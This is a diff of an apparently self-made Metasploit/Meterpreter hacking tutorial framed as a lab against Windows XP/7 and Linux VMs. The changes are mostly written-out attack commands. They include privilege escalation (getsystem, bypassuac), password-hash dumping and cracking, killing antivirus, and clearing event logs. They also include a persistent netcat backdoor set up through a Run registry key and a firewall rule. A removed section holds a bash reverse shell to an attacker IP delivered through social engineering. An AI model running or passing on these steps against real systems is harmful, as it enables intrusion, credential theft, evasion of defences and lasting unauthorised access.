@@ -1,9 +1,9 @@
 **********************************************
 Straightforward Training™
-Using Metasploit/Meterpreter/Nessus (Advance)
+Using Metasploit/Meterpreter (Advance)
 Author: Saulo S. Ortiz
 Date: 20180602
-Updated 20180707
+Updated 20180710
 **********************************************
 
 DISCLAIMER
@@ -549,10 +549,11 @@ STEP #10: HACKING A TOMCAT SERVER
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #11: GETTING A REVERSE SHELL/ESCALATING RIGHTS IN WINDOWS XP
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-For this exercise you will need a Windows XP to be the “victim”. You can easily find an .iso on the internet even if it’s a 30 day trial version.
+For this exercise you will need a Windows XP to be the “victim”. You can easily find an .iso on the internet even if it’s a
+30 day trial version.
 
-1.	Setup the XP VM using 1 CPU and 1GB ram
-	a.	If you’re using Oracle VirtualBox setup the Video to 128MB
+	1.	Setup the XP VM using 1 CPU and 1GB ram
+		a.	If you’re using Oracle VirtualBox setup the Video to 128MB
 
 2.	Use msfvenom tool to generate the payload…
 	a.	Type msfvenom --help-formats to view a list of formats for your payload
@@ -624,13 +625,14 @@ for the VM program itself. Google the problem if you’re stuck…this is the be
 11.	As Admin we can now let’s elevate our privileges one level higher to System
 	a.	Type getsystem
 	b.	Type getuid
-		i.	…it states: “Server username: NT AUTHORITY\SYSTEM.” Here we can do anything we want…run programs through the cmd prompt of delete files! (((I’m about to pass out from all the evil laughing!)))
+		i.	…it states: “Server username: NT AUTHORITY\SYSTEM.” Here we can do anything we want…run programs through the cmd prompt of
+		delete files! (((I’m about to pass out from all the evil laughing!)))
 
 12.	Let’s try and get a hash dump to get into the system’s SAM file which holds all users and their keys…this may disconnect you
 	a.	Type run hashdump
 		i.	…you now have the SAM file with users and keys
-		ii.	…the first part before of the hash (before the colon) is not as important anymore because there are not a lot of XP systems in the wild unless you
-		count ATM machines; the second part you can use against a rainbow table program or an online rainbow table website
+		ii.	…the first part before of the hash (before the colon) is not as important anymore because there are not a lot of XP systems
+		in the wild unless you count ATM machines; the second part you can use against a rainbow table program or an online rainbow table website
 
 -------------------------------------------------------------------------------------------------------------------------------
 Note: Take a look at the SID numbers in the hash dump…what is 500 and 501? Google what they mean.
@@ -662,7 +664,7 @@ Note: Take a look at the SID numbers in the hash dump…what is 500 and 501? Goo
 	c.	Type exit
 
 18.	Type clearev
-		i.	…clears the Application, System and Security logs at the victim’s machine…not really stealthy but will do the job
+	i.	…clears the Application, System and Security logs at the victim’s machine…not really stealthy but will do the job
 
 -------------------------------------------------------------------------------------------------------------------------------
 Note: Optional…another useful command to use while in shell is sc. Use it to communicate with the Service Control Manager and the services
@@ -672,7 +674,8 @@ Note: Optional…another useful command to use while in shell is sc. Use it to c
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #12: GETTING A REVERSE SHELL/ESCALATING RIGHTS IN WINDOWS 7
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-For this exercise you will need a Windows 7 VM to be the “victim”. You can easily find an .iso on the internet even if it’s a 30 day trial version.
+For this exercise you will need a Windows 7 VM to be the “victim”. You can easily find an .iso on the internet even if it’s a 30 day trial
+version. These steps and steps #13 can also be used with XP.
 
 1.	Setup the Windows 7 VM using 1 CPU with 2 cores and 2GB ram, 4GB if you can spare it is best
 	a.	If you’re using Oracle VirtualBox setup the Video to 128MB
@@ -738,7 +741,8 @@ software for the VM program itself. Google the problem if you’re stuck…that�
 9.	Set the current session to background
 	a.	Type background
 
-10.	Privilege escalation in Windows 7 is a bit trickier than in XP but not by much. There are several ways to do escalation but I will not cover them all here. If you want to learn more about it then use your Googlefu skills.
+10.	Privilege escalation in Windows 7 is a bit trickier than in XP but not by much. There are several ways to do escalation
+but I will not cover them all here. If you want to learn more about it then use your Googlefu skills.
 
 11.	Verify the number of the session in the background and if there are any old sessions kill them
 	a.	Type sessions
@@ -749,9 +753,8 @@ software for the VM program itself. Google the problem if you’re stuck…that�
 	a.	Type use exploit/windows/local/bypassuac
 	b.	Type set session 1
 		i.	…this number must match the session Id from the previous exploit!!!!
-	c.	Type run or exploit
+	c.	Type run or exploit -j
 		i.	…you will get a new meterpreter reverse shell
-
 -------------------------------------------------------------------------------------------------------------------------------
 Note: If you get a UAC Disabled error then that means that the security setting in the Action Center is set to OFF. This is not
 good for any user as anything will install without them knowing. Also this is not the default security setting for it.
@@ -787,19 +790,32 @@ good for any user as anything will install without them knowing. Also this is no
 17.	Type sessions …to view the session list
 	a.	Type sessions # (where # is the Id number of that session)
 
-18.	Before we continue we load the incognito module
-	a.	Type use incognito
-		i.	…used to impersonate another user tokens so we can access systems and networks without having to provide credentials each time you access a file
 
-19.	Upload the payload to the victim’s machine. My original evildoer file which gave use the meterpreter shell was in the Downloads folder therefore when
-I upload this file it will go to that folder…
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #13: MAINTAINING A PERSISTANT BACKDOOR IN WINDOWS 7
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+These steps are a continuation from step #12. They can also be used in XP and its possible that it will work with Windows 8 and 10.
+
+18.	To prevent the connection from begin dropped we’ll move the session to the victim’s machine to maintain connectivity…
+	a.	Type run post/windows/manage/migrate explorer
+		i.	…it will display a new program in memory possible notepad
+	b.	Type getprivs
+		i.	…lists the process privileges
+	c.	Type killav
+		i.	…kills all Antivirus services running
+-------------------------------------------------------------------------------------------------------------------------------
+Note: We can also use the incognito command along with its options and steal tokens to get System level rights… Google what
+incognito is and what it does
+-------------------------------------------------------------------------------------------------------------------------------
+
+19.	Upload the payload to the victim’s machine. My original evildoer file which gave use the meterpreter shell was in the Downloads
+folder therefore when I upload this file it will go to that folder…
 	a.	Type pwd to find out where you are in the victim’s directory
 	b.	Type upload –f payload.exe c:\\users\\<username>\\downloads
 		i.	…no, the \\ are NOT typos…check the message after uploading to see how they work
 	c.	Type shell then cd c:\users\<username>\downloads
 		i.	…username will be the current user you’re using
 	d.	Type dir to see the contents of the folder
-
 -------------------------------------------------------------------------------------------------------------------------------
 Note: If you misplace an uploaded file use the where command in Windows shell to find its location
 -------------------------------------------------------------------------------------------------------------------------------
@@ -826,9 +842,9 @@ Note: If you misplace an uploaded file use the where command in Windows shell to
 
 24.	Type exit to exit the Windows shell
 		i.	…you’re back in meterpreter
-
 -------------------------------------------------------------------------------------------------------------------------------
-Note: Did you know that you can dir to the victim from meterpreter without being in shell? Did you also noticed that this sentence made sense to you?!
+Note: Did you know that you can dir to the victim from meterpreter without being in shell? Did you also noticed that this sentence
+made sense to you?!
 -------------------------------------------------------------------------------------------------------------------------------
 
 25.	These two commands are useful to have and only work from meterpreter and not from inside the Windows shell
@@ -846,7 +862,6 @@ Note: Did you know that you can dir to the victim from meterpreter without being
 27.	Use cat to view the files
 	a.	Type cat list.txt
 	b.	Type cat curr_user.txt
-
 -------------------------------------------------------------------------------------------------------------------------------
 Note: I tried writing a small BASH script and found out that using a text editor like nano from within msfconsole will crash/freeze
 the session even if you put it in the background. If this happens to you don’t forget to check how many sessions you have running
@@ -856,9 +871,8 @@ when you return to what you were doing; also kill any unused sessions that may b
 28.	Let’s try and get a hash dump to get into the system’s SAM file which holds all users and their keys…this may disconnect you
 	a.	Type run hashdump
 		i.	…you now have the SAM file with users and keys
-		ii.	…the first part before of the hash (before the colon) is not as important anymore because there are not a lot of XP systems in
-		the wild unless you count ATM machines; the second part you can use against a rainbow table in a program or an online rainbow table website
-
+		ii.	…the first part before of the hash (before the colon) is not as important anymore because there are not a lot of XP systems
+		in the wild unless you count ATM machines; the second part you can use against a rainbow table in a program or an online rainbow table website
 -------------------------------------------------------------------------------------------------------------------------------
 Note: Take a look at the numbers in the hash dump…what is 500 and 501? Google what they mean.
 -------------------------------------------------------------------------------------------------------------------------------
@@ -868,96 +882,65 @@ Note: Take a look at the numbers in the hash dump…what is 500 and 501? Google 
 	b.	Use Ctrl+C to paste the hash in it
 	c.	Scroll down and enter the CAPTCHA then hit the submit button
 	d.	Scroll up and verify your hash was found…it will also give you the password on the right side box
-
 -------------------------------------------------------------------------------------------------------------------------------
 Note: XP uses NT, Windows 7 and later uses NTLM
 -------------------------------------------------------------------------------------------------------------------------------
 
 30.	Since you now have the hash dump you can take all of them and save them with notepad++ so you can run them through rainbow tables
 
-31.	To prevent the connection from begin dropped we’ll move the session to that machine to maintain the connection…
-	a.	Type run post/windows/manage/migrate
-		i.	…it will display a new program in memory possible notepad
-
-32.	Go to the Windows VM and open Task Manager
+31.	Go to the Windows VM and open Task Manager
 	a.	In the Processes tab find the evildoer process and end the process
 
-33.	Go back to Kali…it will show a “session 1 closed. Reason: Died” message
+32.	Go back to Kali…it will show a “session 1 closed. Reason: Died” message
 	a.	Type dir
 		i.	…you will get the directory from the Windows VM machine
 	b.	Type shell
 		i.	...it will show you a “Failed to spawn” error but it connected anyway
 	c.	Type exit
 
-34.	Type clearev
+33.	Now we upload netcat and do some registry editing so we can maintain a persistent connection…
+	a.	Type upload –f /usr/share/windows-binaries/nc.exe c:\\windows\\system32
+		i.	…again notice the double \\
+	b.	Type reg enumkey –k HKLM\\software\\microsoft\\windows\\currentversion\\run
+		i.	…adds a registry key so netcat boots up every time the systems is turned on…
+	c.	Type reg setval –k HKLM\\software\\microsoft\\windows\\currentversion\\run –v nc –d ’C:\Windows\system32\nc.exe –Ldp 31337 –e cmd.exe’
+		i.	…adds another registry letting the value know where nc.exe is located, the port to open and what to run once it connects
+-------------------------------------------------------------------------------------------------------------------------------
+Note: Optional: Type reg queryval –k HKLM\\software\\microsoft\\windows\\currentversion\\run –v nc …if you want to confirm the parameters are correct
+Also optional, you can do a port scan (nmap –sS <victim_ip_address> -vv ) to check the ports
+-------------------------------------------------------------------------------------------------------------------------------
+
+34.	Now we create a new firewall rule in the Windows firewall
+	a.	Type shell
+	b.	Type netsh firewall show opmode
+		i.	…shows operational mode of the firewall
+		ii.	…deprecated but still works
+	c.	Type netsh advfirewall firewall
+		i.	…for more options
+	d.	Type netsh advfirewall firewall add rule name=”netcat” protocol=tcp localport=31337 dir=in action=allow program=”c:\windows\system32\nc.exe”
+		i.	…adds the rule
+	e.	Type netsh advfirewall firewall show rule netcat
+		i.	…to confirm
+-------------------------------------------------------------------------------------------------------------------------------
+Note: If you’re victim is tech-savvy and has a sandbox program protecting c:\ then uploading may not work
+-------------------------------------------------------------------------------------------------------------------------------
+
+35.	Before we log out and reboot the Windows VM…
+	a.	Type clearev
 		i.	…clears the Application, System and Security logs at the victim’s machine…not really stealthy but will do the job
 
+36.	Now reboot the Windows VM
+	a.	Type exit to go back to meterpreter
+	b.	Type reboot
+		i.	…you will lose connectivity
+	c.	Use Ctrl+C to interrupt then type exit
+		i.	…you’re back to the regular terminal screen
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-STEP #13: GETTING A REVERSE SHELL IN LINUX
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-You will need another Linux VM for this step.
+37.	Log-in to the Windows VM …this is when the user logs back in
 
-1.	Setup the Linux VM to use 2GB RAM and a 2 CPUs
-
-2.	Let’s create a bash script payload…open a terminal screen and…
-	a.	Type nano evilfile.sh
-	b.	Enter the following:
-		i.	/bin/bash –i > /dev/tcp/<kali_ip_address>/8080 0<&1 2>&1
-	c.	Ctrl+X to save, Y to save
-
-3.	Give the file executable rights…
-	a.	Type chmod 755 evilfile.sh
-		i.	…you can run it on the victim’s side using ./evilfile.sh
-
-4.	Now we get the victim to download the file. You can do it through social engineering or as a download through the Apache website or even easier to move the file using a USB stick.
-
-5.	In Kali, we’ll put a netcat session in listening mode…
-	a.	Type nc –nlvp 8080
-		i.	…nc is in listening mode
-
-6.	At the victim’s machine…
-	a.	Find the file and type ./evilfile.sh
-
+38.	In Kali…
+	a.	Type nc –v <victim_ip_address> 445
+		i.	…you will have to wait for it to connect
 -------------------------------------------------------------------------------------------------------------------------------
-Note: Have you ever used the TAB key? Type the first two or three letters of a filename then hit TAB…you’re welcome!
+Note: You can also use telnet…type telnet <victim_ip_address> port
 -------------------------------------------------------------------------------------------------------------------------------
-
-7.	Back in Kali you will see that the victim has connected to us…
-
-8.	So many things to do here…
-	a.	Type hostname
-		i.	…shows you the current user
-	b.	Type id
-		i.	…to see the UID’s for the user, groups, admin, etc
-	c.	Type ifconfig
-		i.	…to get the IP address
-	d.	Type blkid
-		i.	…shows you all the devices attached
-	e.	Type netstat –tulpn
-		i.	…shows open listening ports
-	f.	Type service --status-all
-		i.	…shows you all services running
-	g.	Type uname –a
-		i.	…shows you the Linux version and architecture
-	h.	Type less /etc/passwd
-		i.	…shows you the users and rights
-	i.	Type df –h
-		i.	…shows you the hard drive space
-	j.	Type lspci
-		i.	…shows you the PCI bridges, controllers and devices
-
--------------------------------------------------------------------------------------------------------------------------------
-Note: UIDs are the equivalent of SAM files in Windows
--------------------------------------------------------------------------------------------------------------------------------
-
-9.	We cannot use nmap within netcat but we can use netcat to do a scan for us…
-	a.	Type nc –v –w 1 <victim_ip_address> -z 1-1000
-		i.	…-v is verbose, -w 1 wait 1sec, -z operates in zero I/O mode which ignores any latency from the CPU, 1-1000 are the ports
-	b.	Type nc –nuvw 2 <victim_ip_address> -z 1-1000
-		i.	…n bypasses the name resolution, u is for UDP ports
-		ii.	…adding extra seconds can make it more accurate
-		iii.	…search for what other great things you can do with netcat
-
-10.	Let’s upload a file to the victim…
-	a.	Type nc <victim_ip_address> < file.txt
